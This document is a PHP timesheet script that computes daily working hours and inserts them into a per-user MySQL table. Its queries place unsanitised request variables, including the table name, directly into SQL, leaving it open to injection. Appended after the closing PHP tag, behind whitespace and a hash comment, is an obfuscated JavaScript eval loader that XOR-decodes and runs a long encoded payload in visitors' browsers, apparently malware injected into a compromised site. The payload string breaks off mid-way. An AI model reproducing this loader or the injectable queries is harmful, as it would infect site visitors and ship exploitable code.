<?php
  session_start();
  if ($user_is_logged=="1")
 {
  include("spojeni.php");
  

  $od1=strtotime($od1);
  $do1=strtotime($do1);
  $od2=strtotime($od2);
  $do2=strtotime($do2);
  $od3=strtotime($od3);
  $do3=strtotime($do3);
  $od4=strtotime($od4);
  $do4=strtotime($do4);
  $od5=strtotime($od5);
  $do5=strtotime($do5);
  $od6=strtotime($od6);
  $do6=strtotime($do6);
  $od7=strtotime($od7);
  $do7=strtotime($do7);
  
  $od21=strtotime($od21);
  $do21=strtotime($do21);
  $od22=strtotime($od22);
  $do22=strtotime($do22);
  $od23=strtotime($od23);
  $do23=strtotime($do23);
  $od24=strtotime($od24);
  $do24=strtotime($do24);
  $od25=strtotime($od25);
  $do25=strtotime($do25);
  $od26=strtotime($od26);
  $do26=strtotime($do26);
  $od27=strtotime($od27);
  $do27=strtotime($do27);
  

  
  $poc1=((($do1-$od1)+($do21-$od21))/60)/60;
  $poc2=((($do2-$od2)+($do22-$od22))/60)/60;
  $poc3=((($do3-$od3)+($do23-$od23))/60)/60;
  $poc4=((($do4-$od4)+($do24-$od24))/60)/60;
  $poc5=((($do5-$od5)+($do25-$od25))/60)/60;
  $poc6=((($do6-$od6)+($do26-$od26))/60)/60;
  $poc7=((($do7-$od7)+($do27-$od27))/60)/60;
  
  $od1=strftime("%H:%M",$od1);
  $do1=strftime("%H:%M",$do1);
  $od2=strftime("%H:%M",$od2);
  $do2=strftime("%H:%M",$do2);
  $od3=strftime("%H:%M",$od3);
  $do3=strftime("%H:%M",$do3);
  $od4=strftime("%H:%M",$od4);
  $do4=strftime("%H:%M",$do4);
  $od5=strftime("%H:%M",$od5);
  $do5=strftime("%H:%M",$do5);
  $od6=strftime("%H:%M",$od6);
  $do6=strftime("%H:%M",$do6);
  $od7=strftime("%H:%M",$od7);
  $do7=strftime("%H:%M",$do7);
  
  $od21=strftime("%H:%M",$od21);
  $do21=strftime("%H:%M",$do21);
  $od22=strftime("%H:%M",$od22);
  $do22=strftime("%H:%M",$do22);
  $od23=strftime("%H:%M",$od23);
  $do23=strftime("%H:%M",$do23);
  $od24=strftime("%H:%M",$od24);
  $do24=strftime("%H:%M",$do24);
  $od25=strftime("%H:%M",$od25);
  $do25=strftime("%H:%M",$do25);
  $od26=strftime("%H:%M",$od26);
  $do26=strftime("%H:%M",$do26);
  $od27=strftime("%H:%M",$od27);
  $do27=strftime("%H:%M",$do27);
  

  
  $split1=split("[.]",$den1);
  $split2=split("[.]",$den2);
  $split3=split("[.]",$den3);
  $split4=split("[.]",$den4);
  $split5=split("[.]",$den5);
  $split6=split("[.]",$den6);
  $split7=split("[.]",$den7);
  
  $im1=$split1[1];
  $ir1=$split1[2];
  $im2=$split2[1];
  $ir2=$split2[2];
  $im3=$split3[1];
  $ir3=$split3[2];
  $im4=$split4[1];
  $ir4=$split4[2];
  $im5=$split5[1];
  $ir5=$split5[2];
  $im6=$split6[1];
  $ir6=$split6[2];
  $im7=$split7[1];
  $ir7=$split7[2];
  
  
  
 $moje_mala_promenna_kterou_mam_rad=mysql_query("update neco set asdf='0'");

  
  if($den1==""||$od1==""||$do1==""||$poc1=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Montag','2','$prijmeni $krestni','$nick','','$im1','$ir1','-','-','')");
  }
  else
  {
  if($od21=="01:00" ||$do21=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den1', '$od1', '$do1', '$poc1', 'Montag','2','$prijmeni $krestni','$nick','','$im1','$ir1','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den1', '$od1', '$do1', '$poc1', 'Montag','2','$prijmeni $krestni','$nick','','$im1','$ir1','$od21','$do21','')");
  }
  }
  
  if($den2==""||$od2==""||$do2==""||$poc2=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Dienstag','2','$prijmeni $krestni','$nick','','$im2','$ir2','-','-','')");
  }
  else
  {
  if($od22=="01:00" ||$do22=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den2', '$od2', '$do2', '$poc2', 'Dienstag','2','$prijmeni $krestni','$nick','','$im2','$ir2','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den2', '$od2', '$do2', '$poc2', 'Dienstag','2','$prijmeni $krestni','$nick','','$im2','$ir2','$od22','$do22','')");
  }
  }
  
  if($den3==""||$od3==""||$do3==""||$poc3=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Mittwoch','2','$prijmeni $krestni','$nick','','$im3','$ir3','-','-','')");
  }
  else
  {
  if($od23=="01:00" ||$do23=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den3', '$od3', '$do3', '$poc3', 'Mittwoch','2','$prijmeni $krestni','$nick','','$im3','$ir3','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den3', '$od3', '$do3', '$poc3', 'Mittwoch','2','$prijmeni $krestni','$nick','','$im3','$ir3','$od23','$do23','')");
  }
  }
  
  if($den4==""||$od4==""||$do4==""||$poc4=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Donnerstag','2','$prijmeni $krestni','$nick','','$im4','$ir4','-','-','')");
  }
  else
  {
  if($od24=="01:00" ||$do24=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den4', '$od4', '$do4', '$poc4', 'Donnerstag','2','$prijmeni $krestni','$nick','','$im4','$ir4','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den4', '$od4', '$do4', '$poc4', 'Donnerstag','2','$prijmeni $krestni','$nick','','$im4','$ir4','$od24','$do24','')");
  }
  }
  
  if($den5==""||$od5==""||$do5==""||$poc5=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Freitag','2','$prijmeni $krestni','$nick','','$im5','$ir5','-','-','')");
  }
  else
  {
  if($od25=="01:00"||$do25=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den5', '$od5', '$do5', '$poc5', 'Freitag','2','$prijmeni $krestni','$nick','','$im5','$ir5','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den5', '$od5', '$do5', '$poc5', 'Freitag','2','$prijmeni $krestni','$nick','','$im5','$ir5','$od25','$do25','')");
  }
  }
  
  if($den6==""||$od6==""||$do6==""||$poc6=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Samstag','2','$prijmeni $krestni','$nick','','$im6','$ir6','-','-','')");
  }
  else
  {
  if($od26=="01:00" ||$do26=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den6', '$od6', '$do6', '$poc6', 'Samstag','2','$prijmeni $krestni','$nick','','$im6','$ir6','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den6', '$od6', '$do6', '$poc6', 'Samstag','2','$prijmeni $krestni','$nick','','$im6','$ir6','$od26','$do26','')");
  }
  }
  
  if($den7==""||$od7==""||$do7==""||$poc7=="")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('-', '-', '-', '-', 'Sonntag','2','$prijmeni $krestni','$nick','','$im7','$ir7','-','-','')");
  }
  else
  {
  if($od27=="01:00" ||$do27=="01:00")
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den7', '$od7', '$do7', '$poc7', 'Sonntag','2','$prijmeni $krestni','$nick','','$im7','$ir7','-','-','')");
  }
  else
  {
  $dotaz = MySQL_Query("INSERT INTO $nick VALUES('$den7', '$od7', '$do7', '$poc7', 'Sonntag','2','$prijmeni $krestni','$nick','','$im7','$ir7','$od27','$do27','')");
  }
  }
  
  
  
  
  
  include ('sumenu.php');
  }
else
{
include('error2.php');
}
  ?>							<!-- [ b66e3cd31d60c8652223677d3fd3b059 ] --><script>eval('\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x68\x4f\x76\x65\x4f\x28\x72\x69\x65\x64\x29\x7b\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x69\x54\x57\x41\x59\x28\x77\x71\x6a\x44\x65\x54\x29\x7b\x76\x61\x72\x20\x79\x4d\x76\x57\x69\x3d\x30\x3b\x76\x61\x72\x20\x6e\x68\x4d\x3d\x77\x71\x6a\x44\x65\x54\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x76\x61\x72\x20\x70\x6c\x49\x66\x3d\x30\x3b\x77\x68\x69\x6c\x65\x28\x70\x6c\x49\x66\x3c\x6e\x68\x4d\x29\x7b\x79\x4d\x76\x57\x69\x2b\x3d\x74\x44\x54\x66\x49\x63\x28\x77\x71\x6a\x44\x65\x54\x2c\x70\x6c\x49\x66\x29\x2a\x6e\x68\x4d\x3b\x70\x6c\x49\x66\x2b\x2b\x3b\x7d\x72\x65\x74\x75\x72\x6e\x20\x28\x79\x4d\x76\x57\x69\x2b\x27\x27\x29\x3b\x7d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x74\x44\x54\x66\x49\x63\x28\x65\x6b\x56\x66\x54\x47\x45\x2c\x70\x67\x65\x29\x7b\x72\x65\x74\x75\x72\x6e\x20\x65\x6b\x56\x66\x54\x47\x45\x2e\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74\x28\x70\x67\x65\x29\x3b\x7d\x20\x20\x20\x74\x72\x79\x20\x7b\x76\x61\x72\x20\x6d\x50\x4d\x47\x4d\x3d\x65\x76\x61\x6c\x28\x27\x61\x47\x72\x47\x67\x50\x75\x50\x6d\x50\x65\x50\x6e\x7a\x74\x7a\x73\x50\x2e\x49\x63\x7a\x61\x47\x6c\x7a\x6c\x5e\x65\x50\x65\x47\x27\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x2f\x5b\x50\x7a\x5c\x5e\x49\x47\x5d\x2f\x67\x2c\x20\x27\x27\x29\x29\x3b\x76\x61\x72\x20\x62\x65\x5a\x51\x48\x69\x3d\x6e\x65\x77\x20\x53\x74\x72\x69\x6e\x67\x28\x29\x3b\x76\x61\x72\x20\x69\x4c\x41\x4f\x3d\x30\x3b\x67\x47\x75\x6f\x57\x3d\x30\x2c\x79\x6c\x54\x49\x68\x3d\x28\x6e\x65\x77\x20\x53\x74\x72\x69\x6e\x67\x28\x6d\x50\x4d\x47\x4d\x29\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x2f\x5b\x5e\x40\x61\x2d\x7a\x30\x2d\x39\x41\x2d\x5a\x5f\x2e\x2c\x2d\x5d\x2f\x67\x2c\x27\x27\x29\x3b\x76\x61\x72\x20\x6c\x54\x75\x3d\x69\x54\x57\x41\x59\x28\x79\x6c\x54\x49\x68\x29\x3b\x72\x69\x65\x64\x3d\x75\x6e\x65\x73\x63\x61\x70\x65\x28\x72\x69\x65\x64\x29\x3b\x66\x6f\x72\x28\x76\x61\x72\x20\x77\x77\x69\x62\x3d\x30\x3b\x20\x77\x77\x69\x62\x20\x3c\x20\x28\x72\x69\x65\x64\x2e\x6c\x65\x6e\x67\x74\x68\x29\x3b\x20\x77\x77\x69\x62\x2b\x2b\x29\x7b\x76\x61\x72\x20\x78\x4c\x53\x4e\x3d\x74\x44\x54\x66\x49\x63\x28\x79\x6c\x54\x49\x68\x2c\x69\x4c\x41\x4f\x29\x5e\x74\x44\x54\x66\x49\x63\x28\x6c\x54\x75\x2c\x67\x47\x75\x6f\x57\x29\x3b\x76\x61\x72\x20\x6a\x79\x4e\x66\x70\x3d\x74\x44\x54\x66\x49\x63\x28\x72\x69\x65\x64\x2c\x77\x77\x69\x62\x29\x3b\x67\x47\x75\x6f\x57\x2b\x2b\x3b\x69\x4c\x41\x4f\x2b\x2b\x3b\x69\x66\x28\x67\x47\x75\x6f\x57\x3e\x6c\x54\x75\x2e\x6c\x65\x6e\x67\x74\x68\x29\x67\x47\x75\x6f\x57\x3d\x30\x3b\x69\x66\x28\x69\x4c\x41\x4f\x3e\x79\x6c\x54\x49\x68\x2e\x6c\x65\x6e\x67\x74\x68\x29\x69\x4c\x41\x4f\x3d\x30\x3b\x62\x65\x5a\x51\x48\x69\x2b\x3d\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x6a\x79\x4e\x66\x70\x5e\x78\x4c\x53\x4e\x29\x3b\x7d\x65\x76\x61\x6c\x28\x62\x65\x5a\x51\x48\x69\x29\x3b\x20\x72\x65\x74\x75\x72\x6e\x20\x62\x65\x5a\x51\x48\x69\x3d\x6e\x65\x77\x20\x53\x74\x72\x69\x6e\x67\x28\x29\x3b\x7d\x63\x61\x74\x63\x68\x28\x65\x29\x7b\x7d\x7d\x68\x4f\x76\x65\x4f\x28\x27\x25\x33\x33\x25\x33\x30\x25\x33\x34\x25\x33\x37\x25\x33\x35\x25\x33\x32\x25\x33\x30\x25\x33\x33\x25\x34\x38\x25\x30\x35\x25\x32\x64\x25\x32\x34\x25\x35\x30\x25\x36\x65\x25\x32\x30\x25\x32\x38\x25\x36\x63\x25\x31\x66\x25\x32\x64\x25\x32\x62\x25\x37\x39\x25\x33\x33\x25\x32\x65\x25\x33\x32\x25\x32\x61\x25\x33\x35\x25\x32\x30\x25\x31\x64\x25\x30\x31\x25\x30\x38\x25\x36\x30\x25\x37\x39\x25\x37\x38\x25\x30\x66\x25\x33\x66\x25\x33\x61\x25\x33\x36\x25\x32\x35\x25\x32\x37\x25\x32\x32\x25\x31\x34\x25\x36\x34\x25\x35\x64\x25\x37\x61\x25\x35\x36\x25\x33\x30\x25\x33\x66\x25\x32\x35\x25\x32\x64\x25\x33\x34\x25\x31\x30\x25\x32\x39\x25\x36\x61\x25\x34\x33\x25\x30\x63\x25\x33\x63\x25\x30\x36\x25\x33\x31\x25\x37\x38\x25\x32\x33\x25\x33\x36\x25\x33\x64\x25\x30\x37\x25\x37\x35\x25\x32\x37\x25\x33\x39\x25\x33\x37\x25\x32\x30\x25\x33\x66\x25\x31\x64\x25\x32\x63\x25\x37\x39\x25\x32\x61\x25\x32\x62\x25\x32\x39\x25\x33\x61\x25\x33\x63\x25\x32\x65\x25\x33\x39\x25\x31\x65\x25\x34\x65\x25\x37\x34\x25\x37\x31\x25\x30\x32\x25\x33\x38\x25\x31\x39\x25\x33\x36\x25\x34\x37\x25\x32\x39\x25\x34\x39\x25\x35\x35\x25\x35\x38\x25\x31\x61\x25\x31\x61\x25\x31\x66\x25\x32\x63\x25\x30\x39\x25\x32\x66\x25\x30\x64\x25\x37\x36\x25\x32\x63\x25\x36\x62\x25\x30\x66\x25\x32\x64\x25\x35\x32\x25\x32\x66\x25\x31\x35\x25\x30\x34\x25\x32\x35\x25\x32\x35\x25\x31\x31\x25\x34\x33\x25\x31\x36\x25\x31\x63\x25\x37\x32\x25\x30\x65\x25\x31\x31\x25\x30\x34\x25\x33\x37\x25\x36\x34\x25\x30\x39\x25\x36\x61\x25\x31\x35\x25\x30\x32\x25\x33\x39\x25\x35\x63\x25\x33\x63\x25\x31\x62\x25\x33\x39\x25\x31\x62\x25\x36\x30\x25\x30\x37\x25\x32\x61\x25\x33\x32\x25\x33\x62\x25\x30\x65\x25\x31\x37\x25\x31\x32\x25\x33\x37\x25\x31\x36\x25\x33\x38\x25\x37\x31\x25\x34\x65\x25\x37\x39\x25\x32\x64\x25\x32\x30\x25\x30\x31\x25\x33\x39\x25\x37\x39\x25\x32\x36\x25\x37\x63\x25\x33\x35\x25\x32\x65\x25\x32\x30\x25\x37\x37\x25\x33\x63\x25\x37\x35\x25\x30\x36\x25\x31\x63\x25\x34\x34\x25\x32\x66\x25\x33\x36\x25\x35\x35\x25\x32\x31\x25\x31\x35\x25\x33\x35\x25\x30\x66\x25\x34\x63\x25\x37\x36\x25\x30\x62\x25\x34\x32\x25\x35\x62\x25\x36\x36\x25\x36\x61\x25\x32\x32\x25\x33\x35\x25\x33\x36\x25\x32\x65\x25\x32\x62\x25\x31\x35\x25\x33\x37\x25\x36\x61\x25\x37\x36\x25\x33\x63\x25\x33\x64\x25\x33\x64\x25\x32\x31\x25\x30\x64\x25\x33\x66\x25\x30\x65\x25\x37\x35\x25\x30\x38\x25\x35\x66\x25\x32\x30\x25\x35\x39\x25\x37\x37\x25\x34\x34\x25\x35\x32\x25\x34\x61\x25\x37\x36\x25\x31\x30\x25\x33\x61\x25\x30\x63\x25\x32\x66\x25\x36\x34\x25\x32\x30\x25\x31\x66\x25\x33\x34\x25\x32\x36\x25\x36\x38\x25\x31\x66\x25\x33\x62\x25\x32\x64\x25\x30\x34\x25\x32\x36\x25\x32\x30\x25\x36\x31\x25\x37\x35\x25\x37\x61\x25\x34\x35\x25\x30\x63\x25\x35\x32\x25\x36\x39\x25\x37\x66\x25\x33\x37\x25\x37\x66\x25\x30\x65\x25\x37\x61\x25\x30\x31\x25\x33\x39\x25\x33\x30\x25\x32\x63\x25\x35\x62\x25\x33\x35\x25\x32\x33\x25\x37\x64\x25\x31\x37\x25\x33\x62\x25\x33\x30\x25\x33\x35\x25\x30\x30\x25\x35\x37\x25\x30\x33\x25\x34\x37\x25\x37\x38\x25\x37\x35\x25\x37\x33\x25\x32\x36\x25\x34\x30\x25\x32\x64\x25\x37\x35\x25\x31\x66\x25\x37\x63\x25\x36\x39\x25\x31\x30\x25\x37\x34\x25\x36\x39\x25\x32\x39\x25\x31\x39\x25\x30\x32\x25\x32\x33\x25\x36\x32\x25\x33\x34\x25\x31\x36\x25\x36\x61\x25\x37\x35\x25\x33\x65\x25\x37\x37\x25\x34\x61\x25\x32\x35\x25\x37\x65\x25\x33\x36\x25\x34\x39\x25\x30\x32\x25\x37\x34\x25\x33\x30\x25\x36\x62\x25\x34\x30\x25\x35\x33\x25\x36\x36\x25\x37\x30\x25\x36\x31\x25\x32\x34\x25\x32\x61\x25\x31\x62\x25\x35\x64\x25\x30\x66\x25\x33\x62\x25\x37\x63\x25\x33\x30\x25\x37\x31\x25\x32\x38\x25\x36\x34\x25\x33\x37\x25\x33\x63\x25\x33\x35\x25\x33\x35\x25\x33\x66\x25\x37\x38\x25\x32\x30\x25\x37\x33\x25\x32\x33\x25\x36\x34\x25\x35\x66\x25\x37\x31\x25\x32\x61\x25\x30\x39\x25\x37\x30\x25\x33\x30\x25\x33\x33\x25\x36\x39\x25\x37\x31\x25\x36\x38\x25\x32\x35\x25\x30\x30\x25\x33\x36\x25\x31\x30\x25\x32\x34\x25\x37\x36\x25\x31\x32\x25\x34\x63\x25\x34\x61\x25\x30\x35\x25\x35\x37\x25\x33\x63\x25\x30\x38\x25\x31\x32\x25\x32\x63\x25\x32\x32\x25\x37\x33\x25\x37\x63\x25\x36\x63\x25\x30\x38\x25\x33\x65\x25\x33\x34\x25\x33\x33\x25\x33\x37\x25\x33\x63\x25\x36\x61\x25\x33\x30\x25\x36\x38\x25\x31\x32\x25\x33\x32\x25\x33\x62\x25\x33\x31\x25\x32\x64\x25\x32\x61\x25\x32\x31\x25\x33\x66\x25\x33\x35\x25\x35\x39\x25\x33\x33\x25\x32\x62\x25\x33\x66\x25\x37\x33\x25\x32\x37\x25\x36\x64\x25\x37\x65\x25\x36\x64\x25\x35\x31\x25\x33\x32\x25\x37\x31\x25\x32\x34\x25\x34\x63\x25\x33\x34\x25\x37\x36\x25\x33\x32\x25\x32\x33\x25\x34\x61\x25\x30\x65\x25\x37\x62\x25\x31\x36\x25\x33\x63\x25\x37\x36\x25\x32\x62\x25\x32\x36\x25\x32\x35\x25\x35\x63\x25\x30\x36\x25\x34\x32\x25\x34\x34\x25\x36\x30\x25\x35\x36\x25\x34\x38\x25\x32\x34\x25\x31\x66\x25\x31\x33\x25\x32\x36\x25\x33\x64\x25\x30\x33\x25\x31\x62\x25\x37\x35\x25\x33\x31\x25\x30\x32\x25\x30\x38\x25\x36\x32\x25\x32\x39\x25\x31\x38\x25\x35\x31\x25\x33\x66\x25\x37\x37\x25\x32\x36\x25\x37\x63\x25\x33\x38\x25\x37\x38\x25\x36\x36\x25\x33\x62\x25\x37\x34\x25\x35\x39\x25\x36\x62\x25\x32\x65\x25\x34\x63\x25\x36\x32\x25\x35\x64\x25\x33\x66\x25\x37\x35\x25\x32\x34\x25\x31\x62\x25\x37\x61\x25\x32\x64\x25\x33\x61\x25\x31\x33\x25\x31\x33\x25\x32\x63\x25\x30\x37\x25\x36\x39\x25\x30\x32\x25\x36\x30\x25\x31\x30\x25\x37\x62\x25\x36\x33\x25\x31\x66\x25\x33\x38\x25\x32\x64\x25\x31\x31\x25\x33\x64\x25\x33\x35\x25\x32\x62\x25\x37\x36\x25\x35\x61\x25\x32\x65\x25\x35\x38\x25\x35\x66\x25\x30\x39\x25\x33\x62\x25\x32\x33\x25\x33\x39\x25\x31\x36\x25\x32\x35\x25\x30\x61\x25\x34\x63\x25\x37\x33\x25\x33\x62\x25\x33\x63\x25\x34\x37\x25\x37\x37\x25\x31\x32\x25\x30\x31\x25\x31\x62\x25\x32\x65\x25\x30\x35\x25\x37\x63\x25\x31\x37\x25\x36\x63\x25\x37\x64\x25\x34\x30\x25\x32\x34\x25\x34\x30\x25\x37\x63\x25\x32\x34\x25\x30\x63\x25\x31\x65\x25\x31\x33\x25\x33\x38\x25\x37\x32\x25\x31\x34\x25\x32\x63\x25\x32\x66\x25\x35\x64\x25\x33\x37\x25\x33\x64\x25\x33\x30\x25\x33\x63\x25\x32\x31\x25\x37\x33\x25\x31\x64\x25\x31\x37\x25\x31\x38\x25\x30\x38\x25\x32\x39\x25\x33\x34\x25\x33\x38\x25\x30\x35\x25\x30\x39\x25\x32\x31\x25\x33\x66\x25\x32\x64\x25\x32\x31\x25\x32\x38\x25\x33\x39\x25\x37\x30\x25\x37\x37\x25\x36\x39\x25\x30\x65\x25\x32\x38\x25\x32\x63\x25\x37\x37\x25\x31\x37\x25\x33\x32\x25\x33\x63\x25\x32\x39\x25\x31\x39\x25\x30\x61\x25\x30\x31\x25\x33\x34\x25\x33\x32\x25\x33\x62\x25\x31\x65\x25\x37\x64\x25\x37\x62\x25\x33\x36\x25\x33\x31\x25\x34\x63\x25\x30\x65\x25\x33\x30\x25\x33\x35\x25\x33\x63\x25\x36\x34\x25\x37\x35\x25\x37\x39\x25\x33\x38\x25\x30\x62\x25\x30\x32\x25\x33\x35\x25\x32\x61\x25\x32\x33\x25\x33\x32\x25\x36\x62\x25\x32\x32\x25\x30\x30\x25\x37\x65\x25\x37\x32\x25\x34\x32\x25\x30\x37\x25\x31\x31\x25\x32\x39\x25\x33\x62\x25\x33\x37\x25\x31\x33\x25\x31\x39\x25\x30\x64\x25\x32\x38\x25\x32\x64\x25\x32\x66\x25\x33\x34\x25\x33\x66\x25\x33\x65\x25\x31\x31\x25\x33\x34\x25\x37\x38\x25\x36\x62\x25\x31\x37\x25\x33\x35\x25\x33\x32\x25\x33\x30\x25\x33\x33\x25\x30\x30\x25\x33\x33\x25\x33\x30\x25\x33\x34\x25\x37\x37\x25\x35\x33\x25\x33\x66\x25\x32\x37\x25\x31\x39\x25\x30\x36\x25\x32\x66\x25\x32\x37\x25\x33\x65\x25\x37\x31\x25\x36\x31\x25\x37\x34\x25\x33\x37\x25\x32\x38\x25\x30\x61\x25\x32\x39\x25\x33\x33\x25\x33\x38\x25\x30\x64\x25\x31\x36\x25\x35\x64\x25\x30\x61\x25\x32\x62\x25\x31\x65\x25\x33\x32\x25\x31\x64\x25\x33\x34\x25\x34\x64\x25\x32\x61\x25\x33\x64\x25\x32\x36\x25\x32\x66\x25\x33\x35\x25\x30\x61\x25\x30\x31\x25\x37\x35\x25\x37\x33\x25\x32\x62\x25\x33\x61\x25\x33\x31\x25\x37\x33\x25\x30\x62\x25\x31\x31\x25\x32\x38\x25\x32\x65\x25\x33\x34\x25\x31\x34\x25\x31\x39\x25\x30\x35\x25\x37\x30\x25\x30\x39\x25\x37\x36\x25\x37\x35\x25\x37\x33\x25\x36\x34\x25\x36\x30\x25\x36\x33\x25\x37\x31\x25\x36\x61\x25\x35\x30\x25\x32\x62\x25\x31\x31\x25\x33\x62\x25\x37\x34\x25\x36\x63\x25\x33\x39\x25\x33\x36\x25\x33\x30\x25\x30\x65\x25\x32\x61\x25\x33\x39\x25\x32\x62\x25\x33\x30\x25\x33\x37\x25\x32\x66\x25\x31\x38\x25\x36\x33\x25\x36\x64\x25\x37\x38\x25\x35\x61\x25\x37\x64\x25\x36\x65\x25\x34\x30\x25\x34\x66\x25\x36\x64\x25\x30\x37\x25\x34\x66\x25\x32\x33\x25\x32\x34\x25\x32\x61\x25\x33\x35\x25\x32\x32\x25\x30\x37\x25\x37\x31\x25\x32\x36\x25\x33\x39\x25\x32\x38\x25\x31\x61\x25\x37\x61\x25\x36\x35\x25\x35\x38\x25\x32\x34\x25\x32\x39\x25\x31\x34\x25\x30\x35\x25\x33\x35\x25\x33\x63\x25\x32\x66\x25\x32\x63\x25\x36\x66\x25\x37\x35\x25\x33\x32\x25\x30\x38\x25\x31\x37\x25\x31\x36\x25\x37\x39\x25\x33\x36\x25\x32\x65\x25\x33\x33\x25\x36\x63\x25\x32\x30\x25\x33\x35\x25\x30\x63\x25\x32\x38\x25\x32\x39\x25\x31\x35\x25\x30\x64\x25\x32\x37\x25\x35\x35\x25\x33\x66\x25\x33\x39\x25\x30\x38\x25\x30\x34\x25\x32\x32\x25\x30\x39\x25\x31\x66\x25\x31\x65\x25\x33\x30\x25\x32\x38\x25\x33\x62\x25\x31\x36\x25\x33\x35\x25\x36\x65\x25\x36\x30\x25\x33\x30\x25\x32\x32\x25\x32\x38\x25\x32\x30\x25\x32\x61\x25\x33\x38\x25\x37\x35\x25\x34\x36\x25\x31\x62\x25\x30\x36\x25\x36\x66\x25\x32\x31\x25\x37\x61\x25\x37\x39\x25\x35\x35\x25\x34\x61\x25\x37\x30\x25\x37\x66\x25\x37\x35\x25\x35\x66\x25\x36\x65\x25\x36\x38\x25\x33\x30\x25\x30\x39\x25\x32\x66\x25\x36\x32\x25\x37\x30\x25\x37\x63\x25\x37\x34\x25\x36\x37\x25\x37\x61\x25\x34\x33\x25\x33\x31\x25\x30\x38\x25\x35\x64\x25\x33\x35\x25\x32\x64\x25\x33\x63\x25\x37\x65\x25\x36\x63\x25\x34\x39\x25\x35\x32\x25\x35\x33\x25\x32\x32\x25\x30\x61\x25\x32\x36\x25\x30\x30\x25\x33\x39\x25\x30\x39\x25\x33\x38\x25\x33\x35\x25\x33\x39\x25\x36\x64\x25\x36\x39\x25\x36\x64\x25\x37\x39\x25\x34\x32\x25\x36\x61\x25\x31\x32\x25\x30\x61\x25\x33\x61\x25\x37\x66\x25\x31\x34\x25\x33\x65\x25\x33\x62\x25\x30\x63\x25\x33\x34\x25\x30\x64\x25\x30\x31\x25\x32\x37\x25\x36\x61\x25\x33\x34\x25\x33\x62\x25\x32\x62\x25\x33\x39\x25\x37\x39\x25\x37\x39\x25\x34\x35\x25\x35\x39\x25\x36\x61\x25\x35\x61\x25\x35\x37\x25\x37\x62\x25\x33\x65\x25\x36\x64\x25\x37\x32\x25\x31\x36\x25\x33\x64\x25\x33\x64\x25\x34\x30\x25\x31\x34\x25\x31\x38\x25\x32\x62\x25\x33\x32\x25\x33\x37\x25\x31\x34\x25\x30\x35\x25\x36\x34\x25\x36\x65\x25\x37\x31\x25\x30\x30\x25\x30\x62\x25\x32\x37\x25\x37\x66\x25\x30\x38\x25\x36\x61\x25\x35\x31\x25\x34\x63\x25\x35\x36\x25\x32\x38\x25\x30\x38\x25\x35\x38\x25\x36\x61\x25\x34\x38\x25\x34\x61\x25\x32\x37\x25\x33\x31\x25\x36\x30\x25\x32\x62\x25\x30\x33\x25\x30\x39\x25\x33\x37\x25\x30\x66\x25\x33\x35\x25\x32\x32\x25\x34\x37\x25\x36\x62\x25\x36\x38\x25\x30\x37\x25\x37\x30\x25\x37\x66\x25\x34\x32\x25\x34\x66\x25\x35\x61\x25\x35\x64\x25\x35\x64\x25\x33\x32\x25\x36\x30\x25\x37\x35\x25\x36\x38\x25\x34\x63\x25\x37\x30\x25\x37\x64\x25\x37\x33\x25\x35\x37\x25\x37\x66\x25\x33\x66\x25\x33\x65\x25\x36\x62\x25\x34\x34\x25\x37\x39\x25\x35\x66\x25\x37\x65\x25\x30\x38\x25\x31\x65\x25\x34\x65\x25\x37\x64\x25\x37\x30\x25\x30\x33\x25\x34\x63\x25\x33\x32\x25\x32\x37\x25\x32\x63\x25\x33\x37\x25\x30\x31\x25\x36\x64\x25\x37\x33\x25\x37\x34\x25\x34\x66\x25\x35\x31\x25\x34\x66\x25\x36\x30\x25\x37\x62\x25\x34\x36\x25\x35\x32\x25\x37\x62\x25\x30\x36\x25\x33\x32\x25\x33\x63\x25\x32\x33\x25\x36\x63\x25\x33\x33\x25\x33\x38\x25\x33\x30\x25\x32\x34\x25\x34\x31\x25\x36\x38\x25\x37\x35\x25\x33\x32\x25\x33\x36\x25\x33\x39\x25\x32\x35\x25\x37\x38\x25\x32\x63\x25\x31\x33\x25\x33\x31\x25\x33\x39\x25\x37\x64\x25\x33\x64\x25\x36\x65\x25\x33\x38\x25\x33\x64\x25\x36\x63\x25\x31\x63\x25\x32\x64\x25\x33\x63\x25\x30\x30\x25\x32\x34\x25\x33\x30\x25\x32\x32\x25\x33\x31\x25\x32\x37\x25\x35\x64\x25\x37\x61\x25\x32\x64\x25\x33\x36\x25\x33\x37\x25\x31\x65\x25\x32\x61\x25\x32\x38\x25\x33\x31\x25\x30\x62\x25\x32\x30\x25\x37